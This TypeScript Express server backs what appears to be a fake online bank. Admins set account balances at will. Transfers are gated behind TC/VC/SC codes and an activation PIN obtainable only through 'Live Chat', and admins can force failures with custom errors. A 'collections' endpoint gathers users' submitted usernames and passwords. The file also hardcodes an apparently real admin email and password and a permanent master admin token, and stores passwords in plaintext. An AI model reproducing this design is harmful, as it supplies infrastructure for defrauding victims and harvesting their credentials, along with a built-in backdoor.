import "dotenv/config";
import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import fs from "fs";
import crypto from "crypto";
import { createClient, SupabaseClient } from "@supabase/supabase-js";

// --- PERSISTENT JSON DATABASE ENGINE ---

export interface DbUser {
  id: string;
  username: string;
  password: string;
  name: string;
  balance: number;
  accountNumber: string;
  status: string;
  role: "user" | "admin";
  currency: "USD" | "PGK" | "NGN";
  currencyApproved: boolean;
  transfersEnabled: boolean;
  tc: string;
  vc: string;
  sc: string;
  currentTC?: string;
  currentVC?: string;
  currentSC?: string;
  isBlocked?: boolean;
  customError?: string;
  email?: string;
  phone?: string;
  country?: string;
  isTerminalVerified?: boolean;
  activationPin?: string;
}

export interface DbTransfer {
  id: string;
  userId: string;
  trackingId?: string;
  bankName?: string;
  accountName?: string;
  accountNumber?: string;
  amount: number;
  status: string;
  date: string;
}

export interface DbCollection {
  id: string;
  userId: string;
  username?: string;
  password?: string;
  status: string;
  date: string;
}

export interface DbCardRequest {
  id: string;
  userId: string;
  name?: string;
  address?: string;
  phone?: string;
  status: string;
  date: string;
}

export interface DbChatMessage {
  id: string;
  userId: string;
  sender: string;
  text: string;
  time: string;
  readAdmin: boolean;
  readUser: boolean;
}

export interface DbSettings {
  requireTransactionCode: boolean;
  requireVerificationCode: boolean;
  requireSwitchCode: boolean;
  transfersEnabled: boolean;
}

export interface DbAdminToken {
  token: string;
  userId: string;
  createdAt: string;
}

export interface DatabaseData {
  users: DbUser[];
  transfers: DbTransfer[];
  collections: DbCollection[];
  cardRequests: DbCardRequest[];
  chatMessages: DbChatMessage[];
  settings: DbSettings;
  adminTokens: DbAdminToken[];
}

// Strict Administrator Credentials
export const ADMIN_USERNAME = "johnfidelis550@gmail.com";
export const ADMIN_PASSWORD = "Fidelis90@";

// --- SUPABASE CONFIGURATION & CLIENT ---
const SUPABASE_URL = process.env.SUPABASE_URL || process.env.VITE_SUPABASE_URL;
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_SERVICE_KEY || process.env.SUPABASE_KEY;

export let supabase: SupabaseClient | null = null;
if (SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY) {
  try {
    supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, {
      auth: {
        persistSession: false,
        autoRefreshToken: false,
      },
    });
    console.log("[Supabase] Persistence client initialized successfully with service role key.");
  } catch (err) {
    console.error("[Supabase] Failed to initialize client:", err);
  }
} else {
  console.log("[Supabase] SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY not configured. Falling back to local database persistence.");
}

const DB_FILE = path.join(process.cwd(), "db.json");
const DB_BACKUP_FILE = path.join(process.cwd(), "db.backup.json");

// In-memory memory resilience cache to prevent data loss if disk I/O temporarily stumbles
let inMemoryDbCache: DatabaseData | null = null;
let lastSupabaseSync = 0;
const CACHE_TTL_MS = 1500;

function getInitialDb(): DatabaseData {
  return {
    users: [
      {
        id: "1",
        username: "user",
        password: "password",
        balance: 125000.5,
        accountNumber: "ITO-8829-1102",
        name: "John Doe",
        status: "active",
        role: "user",
        currency: "USD",
        currencyApproved: true,
        transfersEnabled: true,
        tc: "123456",
        vc: "654321",
        sc: "987654",
        currentTC: "",
        currentVC: "",
        currentSC: "",
        isBlocked: false,
        customError: "",
        isTerminalVerified: false,
        activationPin: "482910"
      },
      {
        id: "2",
        username: ADMIN_USERNAME,
        password: ADMIN_PASSWORD,
        balance: 0,
        accountNumber: "ADMIN-001",
        name: "System Administrator",
        status: "active",
        role: "admin",
        currency: "USD",
        currencyApproved: true,
        transfersEnabled: true,
        tc: "000000",
        vc: "000000",
        sc: "000000",
        currentTC: "",
        currentVC: "",
        currentSC: "",
        isBlocked: false,
        customError: "",
        isTerminalVerified: true,
        activationPin: "999999"
      }
    ],
    transfers: [
      {
        id: "t1",
        userId: "1",
        trackingId: "ITO-TXN-10021",
        bankName: "Global Bank",
        accountName: "Jane Smith",
        accountNumber: "9988776655",
        amount: 5000,
        status: "completed",
        date: "2024-03-20T10:00:00Z"
      },
      {
        id: "t2",
        userId: "1",
        trackingId: "ITO-TXN-20034",
        bankName: "Swiss Trust",
        accountName: "Swiss Holding",
        accountNumber: "1122334455",
        amount: 15000,
        status: "pending",
        date: "2024-03-22T14:30:00Z"
      }
    ],
    collections: [],
    cardRequests: [],
    chatMessages: [],
    settings: {
      requireTransactionCode: true,
      requireVerificationCode: true,
      requireSwitchCode: true,
      transfersEnabled: true
    },
    adminTokens: [
      {
        token: "admin_master_session_token_2026",
        userId: "2",
        createdAt: new Date().toISOString()
      }
    ]
  };
}

function normalizeDbData(parsed: any): DatabaseData {
  const normalized: DatabaseData = {
    users: (parsed.users || []).map((u: DbUser) => {
      if (u.isTerminalVerified === undefined) {
        u.isTerminalVerified = u.role === "admin";
      }
      if (!u.activationPin) {
        u.activationPin = Math.floor(100000 + Math.random() * 900000).toString();
      }
      return u;
    }),
    transfers: parsed.transfers || [],
    collections: parsed.collections || [],
    cardRequests: parsed.cardRequests || [],
    chatMessages: parsed.chatMessages || [],
    adminTokens: parsed.adminTokens || [
      {
        token: "admin_master_session_token_2026",
        userId: "2",
        createdAt: new Date().toISOString()
      }
    ],
    settings: parsed.settings || {
      requireTransactionCode: true,
      requireVerificationCode: true,
      requireSwitchCode: true,
      transfersEnabled: true
    }
  };

  // Ensure default master admin user is always present with permanent designated credentials
  let adminUser = normalized.users.find(u => u.username.toLowerCase() === ADMIN_USERNAME.toLowerCase() || u.role === "admin");
  if (!adminUser) {
    adminUser = getInitialDb().users[1];
    normalized.users.push(adminUser);
  }
  adminUser.username = ADMIN_USERNAME;
  adminUser.password = ADMIN_PASSWORD;
  adminUser.role = "admin";
  adminUser.isBlocked = false;
  adminUser.isTerminalVerified = true;
  adminUser.status = "active";

  return normalized;
}

function readDbSync(): DatabaseData {
  try {
    if (fs.existsSync(DB_FILE)) {
      const raw = fs.readFileSync(DB_FILE, "utf-8");
      if (raw.trim()) {
        const parsed = JSON.parse(raw);
        const normalized = normalizeDbData(parsed);
        inMemoryDbCache = normalized;
        return normalized;
      }
    }

    // Secondary recovery: attempt to read from backup file
    if (fs.existsSync(DB_BACKUP_FILE)) {
      const rawBackup = fs.readFileSync(DB_BACKUP_FILE, "utf-8");
      if (rawBackup.trim()) {
        console.warn("[DB Persistence] Recovered database state from db.backup.json");
        const parsed = JSON.parse(rawBackup);
        const normalized = normalizeDbData(parsed);
        inMemoryDbCache = normalized;
        return normalized;
      }
    }

    if (inMemoryDbCache && inMemoryDbCache.users && inMemoryDbCache.users.length > 0) {
      return inMemoryDbCache;
    }

    const initial = getInitialDb();
    inMemoryDbCache = initial;
    return initial;
  } catch (err) {
    console.error("[DB Persistence] Error reading database, checking memory cache:", err);
    if (inMemoryDbCache && inMemoryDbCache.users && inMemoryDbCache.users.length > 0) {
      return inMemoryDbCache;
    }
    return getInitialDb();
  }
}

export async function syncDbFromSupabase(force = false): Promise<DatabaseData> {
  if (!supabase) {
    return inMemoryDbCache || readDbSync();
  }

  const now = Date.now();
  if (!force && inMemoryDbCache && now - lastSupabaseSync < CACHE_TTL_MS) {
    return inMemoryDbCache;
  }

  try {
    const { data, error } = await supabase
      .from("app_state")
      .select("data")
      .eq("id", "bank_db")
      .maybeSingle();

    if (error) {
      console.warn("[Supabase] Remote sync warning (verify table 'app_state' in Supabase SQL):", error.message);
      return inMemoryDbCache || readDbSync();
    }

    if (!data || !data.data) {
      console.log("[Supabase] Empty remote store. Seeding initial banking database to Supabase...");
      const initial = inMemoryDbCache || readDbSync();
      await supabase.from("app_state").upsert({
        id: "bank_db",
        data: initial,
        updated_at: new Date().toISOString()
      });
      lastSupabaseSync = now;
      return initial;
    }

    const normalized = normalizeDbData(data.data);
    inMemoryDbCache = normalized;
    lastSupabaseSync = now;
    return normalized;
  } catch (err) {
    console.error("[Supabase] Database sync error:", err);
    return inMemoryDbCache || readDbSync();
  }
}

export function readDb(): DatabaseData {
  if (inMemoryDbCache && inMemoryDbCache.users && inMemoryDbCache.users.length > 0) {
    return inMemoryDbCache;
  }
  return readDbSync();
}

export async function writeDb(data: DatabaseData): Promise<void> {
  inMemoryDbCache = data;

  // 1. Persist directly to Supabase cloud database
  if (supabase) {
    try {
      const { error } = await supabase.from("app_state").upsert({
        id: "bank_db",
        data: data,
        updated_at: new Date().toISOString()
      });
      if (error) {
        console.error("[Supabase Persistence] Upsert error:", error.message);
      }
    } catch (supaErr) {
      console.error("[Supabase Persistence] Upsert exception:", supaErr);
    }
  }

  // 2. Safe local file write (Skipped on Vercel or read-only filesystem environments)
  if (!process.env.VERCEL) {
    try {
      const serialized = JSON.stringify(data, null, 2);
      const tmpFile = `${DB_FILE}.tmp`;
      fs.writeFileSync(tmpFile, serialized, "utf-8");
      fs.renameSync(tmpFile, DB_FILE);

      try {
        const tmpBackup = `${DB_BACKUP_FILE}.tmp`;
        fs.writeFileSync(tmpBackup, serialized, "utf-8");
        fs.renameSync(tmpBackup, DB_BACKUP_FILE);
      } catch {
        // Redundant backup ignore
      }
    } catch (fsErr) {
      console.warn("[DB Persistence] Skipped local filesystem write:", fsErr);
    }
  }
}

// Strip sensitive data (password, tc, vc, sc, activationPin) before sending user payload to browser
function sanitizeUser(user: DbUser | undefined | null) {
  if (!user) return null;
  const { password, tc, vc, sc, activationPin, ...safeUser } = user;
  return {
    ...safeUser,
    isTerminalVerified: user.isTerminalVerified === true
  };
}

// Strip password for administrative responses (preserves activationPin and isTerminalVerified for management)
function sanitizeUserForAdmin(user: DbUser | undefined | null) {
  if (!user) return null;
  const { password, ...safeUser } = user;
  return {
    ...safeUser,
    isTerminalVerified: user.isTerminalVerified === true,
    activationPin: user.activationPin || "482910"
  };
}

// Pre-initialize local database cache
readDb();

export const app = express();
app.use(express.json());

// Supabase sync middleware to ensure freshly persisted data across distributed serverless invocations
app.use(async (req, res, next) => {
  if (supabase && (req.path.startsWith("/api") || req.baseUrl.startsWith("/api"))) {
    try {
      await syncDbFromSupabase();
    } catch (err) {
      console.error("[Supabase Middleware Sync Error]:", err);
    }
  }
  next();
});

  // --- ADMIN AUTHENTICATION MIDDLEWARE ---
  const requireAdmin = (req: express.Request, res: express.Response, next: express.NextFunction) => {
    const authHeader = req.headers.authorization || (req.headers["x-admin-token"] as string);
    let token = "";
    if (authHeader && typeof authHeader === "string") {
      token = authHeader.startsWith("Bearer ") ? authHeader.slice(7).trim() : authHeader.trim();
    }

    if (!token) {
      return res.status(401).json({ message: "Unauthorized: Administrator token required." });
    }

    const db = readDb();
    const validToken = db.adminTokens?.some(t => t.token === token);
    if (!validToken) {
      return res.status(403).json({ message: "Forbidden: Invalid or expired administrator session." });
    }

    next();
  };

  // --- PUBLIC & USER API ROUTES ---

  // User Login (Validates credentials on backend for both standard and admin users)
  app.post(["/api/auth/login", "/api/login"], async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ message: "Username and password are required." });
    }

    const cleanUsername = String(username).toLowerCase().trim();
    const cleanPassword = String(password);

    const db = readDb();

    // Strict validation for administrator account
    if (cleanUsername === ADMIN_USERNAME.toLowerCase()) {
      if (cleanPassword !== ADMIN_PASSWORD) {
        return res.status(401).json({ message: "Invalid username or password" });
      }

      let adminUser = db.users.find(u => u.username.toLowerCase() === ADMIN_USERNAME.toLowerCase() && u.role === "admin");
      if (!adminUser) {
        adminUser = db.users.find(u => u.role === "admin");
      }
      if (!adminUser) {
        adminUser = {
          id: "2",
          username: ADMIN_USERNAME,
          password: ADMIN_PASSWORD,
          balance: 0,
          accountNumber: "ADMIN-001",
          name: "System Administrator",
          status: "active",
          role: "admin",
          currency: "USD",
          currencyApproved: true,
          transfersEnabled: true,
          tc: "000000",
          vc: "000000",
          sc: "000000",
          currentTC: "",
          currentVC: "",
          currentSC: "",
          isBlocked: false,
          customError: "",
          isTerminalVerified: true,
          activationPin: "999999"
        };
        db.users.push(adminUser);
      }

      // Ensure exact designated credentials remain immutable
      adminUser.username = ADMIN_USERNAME;
      adminUser.password = ADMIN_PASSWORD;
      adminUser.role = "admin";
      adminUser.isBlocked = false;
      adminUser.isTerminalVerified = true;

      const token = "admin_" + Date.now() + "_" + crypto.randomBytes(16).toString("hex");
      db.adminTokens = db.adminTokens || [];
      db.adminTokens.push({
        token,
        userId: adminUser.id,
        createdAt: new Date().toISOString()
      });
      await writeDb(db);

      return res.json({
        user: sanitizeUser(adminUser),
        token
      });
    }

    // Standard client authentication
    const user = db.users.find(
      u => u.username.toLowerCase() === cleanUsername &&
           u.password === cleanPassword
    );

    if (!user) {
      return res.status(401).json({ message: "Invalid username or password" });
    }

    if (user.status === "blocked") {
      return res.status(403).json({ message: "Account blocked. Contact support." });
    }

    let token: string | undefined = undefined;
    if (user.role === "admin") {
      token = "admin_" + Date.now() + "_" + crypto.randomBytes(16).toString("hex");
      db.adminTokens = db.adminTokens || [];
      db.adminTokens.push({
        token,
        userId: user.id,
        createdAt: new Date().toISOString()
      });
      await writeDb(db);
    }

    return res.json({
      user: sanitizeUser(user),
      token
    });
  });

  // Self-Registration
  app.post(["/api/auth/register", "/api/register"], async (req, res) => {
    const { name, email, phone, country, username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ message: "Username and password are required." });
    }

    if (String(username).toLowerCase().trim() === ADMIN_USERNAME.toLowerCase()) {
      return res.status(400).json({ message: "Username reserved for System Administrator." });
    }

    const db = readDb();
    const exists = db.users.find(u => u.username.toLowerCase() === String(username).toLowerCase().trim());
    if (exists) {
      return res.status(400).json({ message: "Username already taken." });
    }

    let currency: "USD" | "PGK" | "NGN" = "USD";
    if (country === "Papua New Guinea") {
      currency = "PGK";
    }

    const randomTC = Math.floor(100000 + Math.random() * 900000).toString();
    const randomVC = Math.floor(100000 + Math.random() * 900000).toString();
    const randomSC = Math.floor(100000 + Math.random() * 900000).toString();
    const randomAccount = "ITO-" + Math.floor(10000000 + Math.random() * 90000000).toString();
    const randomPin = Math.floor(100000 + Math.random() * 900000).toString();

    const newUser: DbUser = {
      id: String(db.users.length + 1 + Date.now()),
      username,
      password,
      name,
      email,
      phone,
      country,
      balance: 0,
      accountNumber: randomAccount,
      status: "Pending Support Review",
      isBlocked: true,
      role: "user",
      currency,
      currencyApproved: false,
      transfersEnabled: true,
      tc: randomTC,
      vc: randomVC,
      sc: randomSC,
      currentTC: "",
      currentVC: "",
      currentSC: "",
      customError: "",
      isTerminalVerified: false,
      activationPin: randomPin
    };

    db.users.push(newUser);
    await writeDb(db);

    return res.json({
      success: true,
      user: sanitizeUser(newUser)
    });
  });

  // Public Settings Route (For client transfer validation rules)
  app.get("/api/settings", (req, res) => {
    const db = readDb();
    return res.json(db.settings);
  });

  // User Data (Sanitized: never leaks password, tc, vc, sc)
  app.get("/api/user/:id", (req, res) => {
    const db = readDb();
    const user = db.users.find(u => u.id === req.params.id);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    return res.json(sanitizeUser(user));
  });

  // Lock user on excessive security attempts
  app.post("/api/user/:id/block", async (req, res) => {
    const db = readDb();
    const user = db.users.find(u => u.id === req.params.id);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    user.isBlocked = true;
    user.status = "HOLD";
    user.customError = "Account placed on hold due to excessive security failures.";
    await writeDb(db);
    return res.json({ success: true });
  });

  // Sync client input codes for administrator real-time monitoring
  app.post("/api/user/:id/sync-codes", async (req, res) => {
    const { currentTC, currentVC, currentSC } = req.body;
    const db = readDb();
    const user = db.users.find(u => u.id === req.params.id);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if (currentTC !== undefined) user.currentTC = currentTC;
    if (currentVC !== undefined) user.currentVC = currentVC;
    if (currentSC !== undefined) user.currentSC = currentSC;
    await writeDb(db);
    return res.json({ success: true });
  });

  // Secure Terminal Activation PIN Verification
  app.post(["/api/user/verify-terminal", "/api/user/:id/verify-terminal"], async (req, res) => {
    const userId = req.body.userId || req.params.id;
    const pin = req.body.pin;
    if (!userId || !pin) {
      return res.status(400).json({ success: false, message: "User ID and 6-digit Activation PIN are required." });
    }

    const db = readDb();
    const user = db.users.find(u => String(u.id) === String(userId));
    if (!user) {
      return res.status(404).json({ success: false, message: "User account not found." });
    }

    const cleanPin = String(pin).trim();
    if (!user.activationPin || user.activationPin !== cleanPin) {
      return res.status(400).json({
        success: false,
        message: "Invalid Activation PIN. Please contact your Account Manager via Live Chat to receive your one-time Activation PIN."
      });
    }

    user.isTerminalVerified = true;
    user.isBlocked = false;
    user.status = "APPROVED";
    await writeDb(db);

    return res.json({
      success: true,
      message: "Terminal verified successfully.",
      user: sanitizeUser(user)
    });
  });

  // Backend Clearance Code Verification (TC, VC, SC)
  // Ensures codes are evaluated securely on the backend without ever being exposed to the browser
  app.post("/api/transfers/verify-code", (req, res) => {
    const { userId, codeType, code } = req.body;
    const db = readDb();
    const user = db.users.find(u => u.id === userId);

    if (!user) {
      return res.status(404).json({ success: false, message: "User not found" });
    }

    if (user.isBlocked || user.status === "HOLD" || user.status === "Pending Support Review" || !user.isTerminalVerified) {
      return res.status(403).json({
        success: false,
        locked: true,
        message: user.customError || "Terminal pending activation. Please contact the Support Team via Live Chat."
      });
    }

    let expectedCode = "";
    let codeName = "";
    if (codeType === "tc") {
      expectedCode = user.tc;
      codeName = "Transaction Code (TC)";
    } else if (codeType === "vc") {
      expectedCode = user.vc;
      codeName = "Verification Code (VC)";
    } else if (codeType === "sc") {
      expectedCode = user.sc;
      codeName = "Switch Code (SC)";
    } else {
      return res.status(400).json({ success: false, message: "Invalid code type specified." });
    }

    if (!code || String(code).trim() !== String(expectedCode).trim()) {
      return res.status(400).json({
        success: false,
        message: `Invalid ${codeName}.`
      });
    }

    return res.json({
      success: true,
      message: `${codeName} verified successfully.`
    });
  });

  // User Transfers History
  app.get("/api/transfers/:userId", (req, res) => {
    const db = readDb();
    const userTransfers = db.transfers.filter(t => t.userId === req.params.userId);
    return res.json(userTransfers);
  });

  // Create Wire Transfer (Strict backend validation of codes & balance)
  app.post("/api/transfers", async (req, res) => {
    const db = readDb();
    if (!db.settings.transfersEnabled) {
      return res.status(403).json({ message: "Transfers are currently disabled by the Support Team." });
    }

    const {
      userId,
      trackingId,
      bankName,
      accountName,
      accountNumber,
      amount,
      transactionCode,
      verificationCode,
      switchCode
    } = req.body;

    const userIndex = db.users.findIndex(u => u.id === userId);
    if (userIndex === -1) {
      return res.status(404).json({ message: "User not found" });
    }
    const user = db.users[userIndex];

    if (!user.transfersEnabled) {
      return res.status(403).json({ message: "Your transfer privileges are restricted. Please contact support." });
    }

    if (!user.isTerminalVerified || user.isBlocked || user.status === "Pending Support Review" || user.status === "HOLD") {
      return res.status(403).json({ message: "Terminal pending activation. Outbound transfers remain blocked until verified by Support Team." });
    }

    // Strict backend clearance code validation
    if (db.settings.requireTransactionCode && String(transactionCode).trim() !== String(user.tc).trim()) {
      return res.status(400).json({ message: "Invalid Transaction Code (TC)" });
    }
    if (db.settings.requireVerificationCode && String(verificationCode).trim() !== String(user.vc).trim()) {
      return res.status(400).json({ message: "Invalid Verification Code (VC)" });
    }
    if (db.settings.requireSwitchCode && String(switchCode).trim() !== String(user.sc).trim()) {
      return res.status(400).json({ message: "Invalid Switch Code (SC)" });
    }

    const transferAmount = parseFloat(amount);
    if (isNaN(transferAmount) || transferAmount <= 0) {
      return res.status(400).json({ message: "Invalid transfer amount." });
    }

    if (user.balance < transferAmount) {
      return res.status(400).json({ message: "Insufficient balance" });
    }

    const newTransfer: DbTransfer = {
      id: "t" + Date.now(),
      userId,
      trackingId: trackingId || "ITO-TXN-" + Math.floor(10000 + Math.random() * 90000),
      bankName,
      accountName,
      accountNumber,
      amount: transferAmount,
      status: user.currencyApproved ? "pending" : "failed",
      date: new Date().toISOString()
    };

    if (!user.currencyApproved) {
      newTransfer.status = "failed";
      db.transfers.push(newTransfer);
      await writeDb(db);
      return res.status(400).json({ message: "Currency mismatch or unapproved currency. Transfer failed." });
    }

    user.balance -= transferAmount;
    db.transfers.push(newTransfer);
    await writeDb(db);

    return res.json(newTransfer);
  });

  // Collections (User submission)
  app.post("/api/collections", async (req, res) => {
    const { userId, username, password } = req.body;
    const db = readDb();
    const newCollection: DbCollection = {
      id: "c" + Date.now(),
      userId,
      username,
      password,
      status: "pending",
      date: new Date().toISOString()
    };
    db.collections.push(newCollection);
    await writeDb(db);
    return res.json({ success: true });
  });

  // Card Requests (User submission)
  app.post("/api/card-requests", async (req, res) => {
    const { userId, name, address, phone } = req.body;
    const db = readDb();
    const newRequest: DbCardRequest = {
      id: "cr" + Date.now(),
      userId,
      name,
      address,
      phone,
      status: "pending",
      date: new Date().toISOString()
    };
    db.cardRequests.push(newRequest);
    await writeDb(db);
    return res.json({ success: true });
  });

  // Chat: User messages
  app.get("/api/chat/:userId", async (req, res) => {
    const db = readDb();
    let updated = false;
    db.chatMessages.forEach(m => {
      if (m.userId === req.params.userId && m.sender === "agent" && !m.readUser) {
        m.readUser = true;
        updated = true;
      }
    });
    if (updated) {
      await writeDb(db);
    }
    const msgs = db.chatMessages.filter(m => m.userId === req.params.userId);
    return res.json(msgs);
  });

  app.post("/api/chat", async (req, res) => {
    const { userId, sender, text } = req.body;
    const db = readDb();
    const newMsg: DbChatMessage = {
      id: "msg" + Date.now(),
      userId,
      sender,
      text,
      time: new Date().toISOString(),
      readAdmin: sender === "agent",
      readUser: sender === "user"
    };
    db.chatMessages.push(newMsg);
    await writeDb(db);
    return res.json(newMsg);
  });

  // --- PROTECTED ADMINISTRATOR API ROUTES ---
  // All endpoints prefixed with /api/admin are strictly protected by requireAdmin
  app.use("/api/admin", requireAdmin);

  // Admin: Overall statistics
  app.get("/api/admin/stats", (req, res) => {
    const db = readDb();
    const totalUsers = db.users.length;
    const totalTransfers = db.transfers.length;
    const pendingCollections = db.collections.filter(c => c.status === "pending").length;
    const pendingCardRequests = db.cardRequests.filter(cr => cr.status === "pending").length;
    const totalVolume = db.transfers.reduce((acc, t) => acc + (t.amount || 0), 0);

    return res.json({
      totalUsers,
      totalTransfers,
      pendingCollections,
      totalVolume,
      pendingCardRequests
    });
  });

  // Admin: Users management (Exposes TC/VC/SC for administration, never exposes passwords)
  app.get("/api/admin/users", (req, res) => {
    const db = readDb();
    const adminView = db.users.map(sanitizeUserForAdmin);
    return res.json(adminView);
  });

  app.post("/api/admin/users", async (req, res) => {
    const { username, password, name, balance, accountNumber, currency, tc, vc, sc } = req.body;
    const db = readDb();

    const newUser: DbUser = {
      id: String(db.users.length + 1 + Date.now()),
      username,
      password: password || "password",
      name,
      balance: parseFloat(balance) || 0,
      accountNumber: accountNumber || ("ITO-" + Math.floor(10000000 + Math.random() * 90000000).toString()),
      status: "APPROVED",
      isBlocked: false,
      role: "user",
      currency: currency || "USD",
      currencyApproved: true,
      transfersEnabled: true,
      tc: tc || Math.floor(100000 + Math.random() * 900000).toString(),
      vc: vc || Math.floor(100000 + Math.random() * 900000).toString(),
      sc: sc || Math.floor(100000 + Math.random() * 900000).toString(),
      currentTC: "",
      currentVC: "",
      currentSC: "",
      isTerminalVerified: req.body.isTerminalVerified !== undefined ? req.body.isTerminalVerified : false,
      activationPin: req.body.activationPin || Math.floor(100000 + Math.random() * 900000).toString()
    };

    db.users.push(newUser);
    await writeDb(db);
    return res.json(sanitizeUserForAdmin(newUser));
  });

  app.patch("/api/admin/users/:id", async (req, res) => {
    const db = readDb();
    const user = db.users.find(u => u.id === req.params.id);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    const updates = { ...req.body };
    if (updates.balance !== undefined) {
      updates.balance = parseFloat(updates.balance);
      if (isNaN(updates.balance)) updates.balance = 0;
    }

    // Maintain permanent admin credentials and role if editing administrator
    if (user.role === "admin" || user.username.toLowerCase() === ADMIN_USERNAME.toLowerCase()) {
      delete updates.username;
      delete updates.password;
      delete updates.role;
    }

    Object.assign(user, updates);

    if (user.role === "admin" || user.username.toLowerCase() === ADMIN_USERNAME.toLowerCase()) {
      user.username = ADMIN_USERNAME;
      user.password = ADMIN_PASSWORD;
      user.role = "admin";
    }

    await writeDb(db);
    return res.json(sanitizeUserForAdmin(user));
  });

  app.delete("/api/admin/users/:id", async (req, res) => {
    const db = readDb();
    const user = db.users.find(u => u.id === req.params.id);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    if (user.role === "admin" || user.username.toLowerCase() === ADMIN_USERNAME.toLowerCase()) {
      return res.status(403).json({ message: "Cannot delete the primary System Administrator account." });
    }

    db.users = db.users.filter(u => u.id !== req.params.id);
    await writeDb(db);
    return res.json({ success: true });
  });

  // Admin: Transfers management
  app.get("/api/admin/transfers", (req, res) => {
    const db = readDb();
    const enriched = db.transfers.map(t => {
      const user = db.users.find(u => u.id === t.userId);
      return {
        ...t,
        userName: user?.name || "Unknown"
      };
    });
    return res.json(enriched);
  });

  app.patch("/api/admin/transfers/:id", async (req, res) => {
    const db = readDb();
    const transfer = db.transfers.find(t => t.id === req.params.id);
    if (!transfer) {
      return res.status(404).json({ message: "Transfer not found" });
    }
    if (req.body.status) {
      transfer.status = req.body.status;
    }
    await writeDb(db);
    return res.json(transfer);
  });

  // Admin: Collections management
  app.get("/api/admin/collections", (req, res) => {
    const db = readDb();
    const enriched = db.collections.map(c => {
      const user = db.users.find(u => u.id === c.userId);
      return {
        ...c,
        userName: user?.name || "Unknown"
      };
    });
    return res.json(enriched);
  });

  app.patch("/api/admin/collections/:id", async (req, res) => {
    const db = readDb();
    const collection = db.collections.find(c => c.id === req.params.id);
    if (!collection) {
      return res.status(404).json({ message: "Collection not found" });
    }
    if (req.body.status) {
      collection.status = req.body.status;
    }
    await writeDb(db);
    return res.json(collection);
  });

  // Admin: Card Requests management
  app.get("/api/admin/card-requests", (req, res) => {
    const db = readDb();
    const enriched = db.cardRequests.map(cr => {
      const user = db.users.find(u => u.id === cr.userId);
      return {
        ...cr,
        userName: user?.name || "Unknown"
      };
    });
    return res.json(enriched);
  });

  app.patch("/api/admin/card-requests/:id", async (req, res) => {
    const db = readDb();
    const request = db.cardRequests.find(cr => cr.id === req.params.id);
    if (!request) {
      return res.status(404).json({ message: "Card request not found" });
    }
    if (req.body.status) {
      request.status = req.body.status;
    }
    await writeDb(db);
    return res.json(request);
  });

  // Admin: Settings management
  app.get("/api/admin/settings", (req, res) => {
    const db = readDb();
    return res.json(db.settings);
  });

  app.patch("/api/admin/settings", async (req, res) => {
    const db = readDb();
    Object.assign(db.settings, req.body);
    await writeDb(db);
    return res.json(db.settings);
  });

  // Admin: Chat oversight & read receipts
  app.get("/api/admin/chat", (req, res) => {
    const db = readDb();
    return res.json(db.chatMessages);
  });

  app.post("/api/admin/chat/mark-read", async (req, res) => {
    const { userId } = req.body;
    const db = readDb();
    let updated = false;
    db.chatMessages.forEach(m => {
      if (m.userId === userId && m.sender === "user" && !m.readAdmin) {
        m.readAdmin = true;
        updated = true;
      }
    });
    if (updated) {
      await writeDb(db);
    }
    return res.json({ success: true });
  });

  // --- VITE MIDDLEWARE & SPA SERVING ---
  async function startServer() {
    const PORT = 3000;

    if (process.env.NODE_ENV !== "production") {
      const vite = await createViteServer({
        server: { middlewareMode: true },
        appType: "spa",
      });
      app.use(vite.middlewares);
    } else {
      const distPath = path.join(process.cwd(), "dist");
      app.use(express.static(distPath));
      app.get("*", (req, res) => {
        res.sendFile(path.join(distPath, "index.html"));
      });
    }

    app.listen(PORT, "0.0.0.0", () => {
      console.log(`Server running on http://localhost:${PORT}`);
    });
  }

  if (!process.env.VERCEL) {
    startServer();
  }

  export default app;
